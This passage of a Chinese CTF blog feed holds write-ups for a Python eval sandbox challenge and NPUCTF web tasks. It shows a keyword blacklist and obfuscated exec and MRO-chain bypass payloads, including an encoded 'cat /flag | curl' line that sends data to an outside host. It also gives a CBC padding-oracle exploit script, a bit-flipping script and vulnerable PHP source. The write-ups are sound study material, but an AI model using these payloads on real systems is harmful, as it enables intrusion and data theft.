class="identifier">input</span>']</span></span><br><span class="line">        create_question = create<span class="literal">()</span></span><br><span class="line">        input_question = session.get('question')</span><br><span class="line">        session<span class="literal">['<span class="identifier">question</span>']</span> = create_question</span><br><span class="line">        <span class="keyword">if</span> input_question<span class="operator"> == </span>None:</span><br><span class="line">            return render<span class="constructor">_template('<span class="params">index</span>.<span class="params">html</span>', <span class="params">answer</span>=<span class="string">"Invalid session please try again!"</span>, <span class="params">question</span>=<span class="params">create_question</span>)</span></span><br><span class="line">        <span class="keyword">if</span> filter(input)==<span class="string">"hack"</span>:</span><br><span class="line">            return render<span class="constructor">_template('<span class="params">index</span>.<span class="params">html</span>', <span class="params">answer</span>=<span class="string">"hack"</span>, <span class="params">question</span>=<span class="params">create_question</span>)</span></span><br><span class="line">        calc_str = input_question + <span class="string">"="</span> + str(input)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            calc_result = str((eval(calc_str)))</span><br><span class="line">        except Exception <span class="keyword">as</span> ex:</span><br><span class="line">            calc_result = <span class="string">"Invalid"</span></span><br><span class="line">        return render<span class="constructor">_template('<span class="params">index</span>.<span class="params">html</span>', <span class="params">answer</span>=<span class="params">calc_result</span>,<span class="params">question</span>=<span class="params">create_question</span>)</span></span><br></pre></td></tr></table></figure><p>后面爬下来的黑名单</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">black_list</span> = [ <span class="string">'os'</span>, <span class="string">'mro'</span>, <span class="string">'request'</span>, <span class="string">'args'</span>, <span class="string">'eval'</span>, <span class="string">'system'</span>,<span class="string">'if'</span>, <span class="string">'for'</span>,<span class="string">'subprocess'</span>, <span class="string">'file'</span>, <span class="string">'builtins'</span>,<span class="string">'compile'</span>,<span class="string">'execfile'</span>,<span class="string">'from_pyfile'</span>,<span class="string">'config'</span>,<span class="string">'local'</span>,<span class="string">'self'</span>,<span class="string">'enter'</span>,<span class="string">'%'</span>,<span class="string">'or'</span>,<span class="string">'ls'</span>,<span class="string">'sys'</span>,<span class="string">'globals'</span>,<span class="string">'read'</span>,<span class="string">'popen'</span>]</span><br></pre></td></tr></table></figure><ul><li>但 <code>exec</code>没被禁所以和1一样，但 <code>exec</code>返回为空所以用<code>,</code>分割</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">"os.system('cat /flag | curl http://1.1.1.1:2333 --data-binary @-')"</span></span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    payload += str(ord(i))+<span class="string">','</span></span><br><span class="line">print(payload)</span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    payload += str(hex(ord(i))).replace(<span class="string">"0x"</span>,<span class="string">""</span>).zfill(<span class="number">2</span>)</span><br><span class="line">print(payload)</span><br></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>,exec(<span class="string">'o'</span>+<span class="string">'s.sy'</span>+<span class="string">'stem("sleep 10")'</span>)  <span class="comment">//明显延时了</span></span><br><span class="line"><span class="number">1</span>,exec(bytes([<span class="number">111</span>, <span class="number">115</span>, <span class="number">46</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">40</span>, <span class="number">39</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">32</span>, <span class="number">47</span>, <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">32</span>, <span class="number">124</span>, <span class="number">32</span>, <span class="number">99</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">32</span>, <span class="number">104</span>, <span class="number">116</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">58</span>, <span class="number">47</span>, <span class="number">47</span>, <span class="number">49</span>, <span class="number">46</span>, <span class="number">49</span>, <span class="number">46</span>, <span class="number">49</span>, <span class="number">46</span>, <span class="number">49</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">51</span>, <span class="number">51</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">45</span>, <span class="number">100</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">45</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">32</span>, <span class="number">64</span>, <span class="number">45</span>, <span class="number">39</span>, <span class="number">41</span>]).decode()) <span class="comment">//curl外带</span></span><br><span class="line"><span class="number">1</span>,exec(bytes.fromhex(<span class="string">'6f732e73797374656d2827636174202f666c6167207c206375726c20687474703a2f2f312e312e312e313a32333333202d2d646174612d62696e61727920402d2729'</span>))</span><br></pre></td></tr></table></figure><ul><li><p>利用继承链</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">104</span>].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].system(<span class="string">"ls"</span>)</span><br><span class="line">getattr(getattr(getattr(getattr(getattr(getattr(getattr([],<span class="string">'__cla'</span>+<span class="string">'ss__'</span>),<span class="string">'__mr'</span>+<span class="string">'o__'</span>)[<span class="number">1</span>],<span class="string">'__subclas'</span>+<span class="string">'ses__'</span>)()[<span class="number">104</span>],<span class="string">'__init__'</span>),<span class="string">'__glob'</span>+<span class="string">'al'</span>+<span class="string">'s__'</span>)[<span class="string">'sy'</span>+<span class="string">'s'</span>],<span class="string">'mod'</span>+<span class="string">'ules'</span>)[<span class="string">'o'</span>+<span class="string">'s'</span>],<span class="string">'sy'</span>+<span class="string">'ste'</span>+<span class="string">'m'</span>)(<span class="string">'l'</span>+<span class="string">'s'</span>)//绕waf</span><br></pre></td></tr></table></figure></li><li><p>字符拼接</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(<span class="string">"o"</span>+<span class="string">"s.s"</span>+<span class="string">"y"</span>+<span class="string">"s"</span>+<span class="string">"t"</span>+<span class="string">"e"</span>+<span class="string">"m('wh"</span>+<span class="string">"oa"</span>+<span class="string">"m"</span>+<span class="string">"i')"</span>)</span><br><span class="line">exec(<span class="string">"o"</span>+<span class="string">"s.s"</span>+<span class="string">"y"</span>+<span class="string">"s"</span>+<span class="string">"t"</span>+<span class="string">"e"</span>+<span class="string">"m('wh"</span>+<span class="string">"oa"</span>+<span class="string">"m"</span>+<span class="string">"i')"</span>)</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; class=&quot;aplayer-secondary-script-marker&quot;&gt;&lt;/script&gt;&lt;h2 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h2&gt;&lt;h3 id=&quot;1-某师傅出的招新题&quot;&gt;&lt;a href=&quot;#1-某师傅出的招新题&quot; class=&quot;headerlink&quot; title=&quot;1.某师傅出的招新题&quot;&gt;&lt;/a&gt;1.某师傅出的招新题&lt;/h3&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/** &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;Flag in flag.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;You can use &quot;readfile&quot; function.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;**/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;TestClass&lt;/span&gt; &lt;/span&gt;&amp;#123; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;show_source(&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$str1 = $_GET[&lt;span class=&quot;string&quot;&gt;&#39;str1&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$str2 = $_GET[&lt;span class=&quot;string&quot;&gt;&#39;str2&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$rce = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; $str2(&lt;span class=&quot;string&quot;&gt;&#39;TestClass&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$a = $rce-&amp;gt;$str1();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$st1 = $_POST[&lt;span class=&quot;string&quot;&gt;&#39;st1&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$st2 = $_POST[&lt;span class=&quot;string&quot;&gt;&#39;st2&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;($st1==&lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;&amp;amp;&amp;amp;$st2==&lt;span class=&quot;keyword&quot;&gt;null&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;GET!!!&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $z = substr($a,$st1,&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $x = substr($a,$st2,&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; $z.&lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;br&amp;gt;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; $x.&lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;br&amp;gt;&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    $z($x);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="刷题" scheme="https://0xcreed.jxustctf.top/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>NPUCTF-复现</title>
    <link href="https://0xcreed.jxustctf.top/2020/05/NPUCTF2020-%E5%A4%8D%E7%8E%B0/"/>
    <id>https://0xcreed.jxustctf.top/2020/05/NPUCTF2020-%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-05-26T09:33:26.000Z</published>
    <updated>2020-06-06T12:42:18.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-web🐕"><a href="#1-web🐕" class="headerlink" title="1.web🐕"></a>1.web🐕</h3><p>当时写这道题，知道只知道是CBC字节反转攻击。</p><p>后面看WP才发现考点</p><ol><li>cbc padding oracle</li><li>cbc 字节翻转</li></ol><p>index.php源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);   <span class="comment"># $key,$flag</span></span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);  <span class="comment">//定义加密方式</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, $key);    <span class="comment">//定义密钥</span></span><br><span class="line">define(<span class="string">"IV"</span>,<span class="string">"6666666666666666"</span>);    <span class="comment">//定义初始向量 16个6</span></span><br><span class="line">define(<span class="string">"BR"</span>,<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))header(<span class="string">'location:./index.php?source=1'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#var_dump($GLOBALS);   //听说你想看这个？</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_encrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"--------encrypt---------"</span>.BR;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'IV:'</span>.$iv.BR;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_decrypt</span><span class="params">($iv,$data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'False'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">'encrypt'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = IV;</span><br><span class="line">    $data = $flag;    </span><br><span class="line">    <span class="keyword">echo</span> aes_encrypt($iv,$data);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'method'</span>]==<span class="string">"decrypt"</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = @$_POST[<span class="string">'iv'</span>];</span><br><span class="line">    $data = @$_POST[<span class="string">'data'</span>];</span><br><span class="line">    <span class="keyword">echo</span> aes_decrypt($iv,$data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"我摊牌了，就是懒得写前端"</span>.BR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'source'</span>]==<span class="number">1</span>)highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>从上面代码可知128位的cbc，blocksize是16字节，加密IV已知，secret未知，我们还知道解密是否成功，密文，我们又可以控制密文和解密的IV，可以使用padding oracle爆出明文。</p><p>具体的<a href="https://www.freebuf.com/articles/web/15504.html" target="_blank" rel="noopener">攻击理论</a></p><p><a href="https://glotozz.github.io/2020/04/20/NPUCTF-wp/#web" target="_blank" rel="noopener">glotozz</a>师傅的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">'http://ha1cyon-ctf.fun:30141/index.php?source&amp;method=decrypt'</span></span><br><span class="line">N = <span class="number">16</span></span><br><span class="line">l = [<span class="number">0</span>] * N</span><br><span class="line">iv = <span class="string">'6666666666666666'</span></span><br><span class="line">tmp_iv = <span class="string">''</span></span><br><span class="line">out = [<span class="number">0</span>] * N</span><br><span class="line">s = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, N+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">        l[N-i] = c</span><br><span class="line">        tmp_iv = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> l:</span><br><span class="line">            tmp_iv += chr(m)</span><br><span class="line">        <span class="keyword">print</span> base64.b64encode(tmp_iv)</span><br><span class="line">        <span class="comment"># print payload</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'iv'</span>: tmp_iv,</span><br><span class="line">            <span class="string">'data'</span>: <span class="string">'ly7auKVQCZWum/W/4osuPA=='</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        data = requests.post(url, data=data).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'False'</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">            out[N-i] = c ^ i</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> range(i):</span><br><span class="line">                l[N-y<span class="number">-1</span>] = out[N-y<span class="number">-1</span>] ^ (i+<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(N):</span><br><span class="line">    out[i] = out[i] ^ ord(iv[i])</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> out:</span><br><span class="line">    s += chr(c)</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><p>爆出明文 <code>FlagIsHere.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);    <span class="comment">//$fl4g</span></span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="string">"6666666"</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_iv</span><span class="params">()</span></span>&#123;    <span class="comment">//生成随机初始向量IV</span></span><br><span class="line">    $random_iv=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$lalala = <span class="string">'piapiapiapia'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'Identity'</span>]))&#123;</span><br><span class="line">    $_SESSION[<span class="string">'iv'</span>] = get_iv();</span><br><span class="line"></span><br><span class="line">    $_SESSION[<span class="string">'Identity'</span>] = base64_encode(openssl_encrypt($lalala, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $_SESSION[<span class="string">'iv'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> base64_encode($_SESSION[<span class="string">'iv'</span>]).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">    $tmp_id = openssl_decrypt(base64_decode($_SESSION[<span class="string">'Identity'</span>]), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_POST[<span class="string">'iv'</span>]));</span><br><span class="line">    <span class="keyword">echo</span> $tmp_id.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>($tmp_id ===<span class="string">'weber'</span>)<span class="keyword">die</span>($fl4g);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>CBC字节反转攻击</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64 <span class="keyword">as</span> b64</span><br><span class="line"></span><br><span class="line">source_str = <span class="string">'piapiapiapia'</span> + <span class="number">4</span> * <span class="string">'\x04'</span></span><br><span class="line">target_srt = <span class="string">'weber'</span> + <span class="number">11</span> * <span class="string">'\x0b'</span></span><br><span class="line">token = <span class="string">'sS8OuVOl9tyCkzAzsabGBA=='</span>  <span class="comment"># 你获得的初始IV的base64encode值</span></span><br><span class="line">token = list(b64.b64decode(token))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(target_srt)):</span><br><span class="line">    token[x] = chr(ord(token[x]) ^ ord(target_srt[x]) ^ ord(source_str[x]))</span><br><span class="line"><span class="keyword">print</span> b64.b64encode(<span class="string">''</span>.join(token))</span><br></pre></td></tr></table></figure><p>得到网盘地址下载得到<code>HelloWorld.class</code>，<code>jd-gui</code>反编译得到byte流,后面python解一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(bytearray([<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">54</span>, <span class="number">95</span>, <span class="number">52</span>, <span class="number">111</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">52</span>, <span class="number">115</span>, <span class="number">121</span>, <span class="number">103</span>, <span class="number">48</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">125</span> ]))</span><br></pre></td></tr></table></figure><h3 id="2-ReadlezPHP"><a href="#2-ReadlezPHP" class="headerlink" title="2.ReadlezPHP"></a>2.ReadlezPHP</h3><p>看源码，跳转到<code>/time.php?source</code>得到源码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">#error_reporting(0);</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $a;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $b;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span 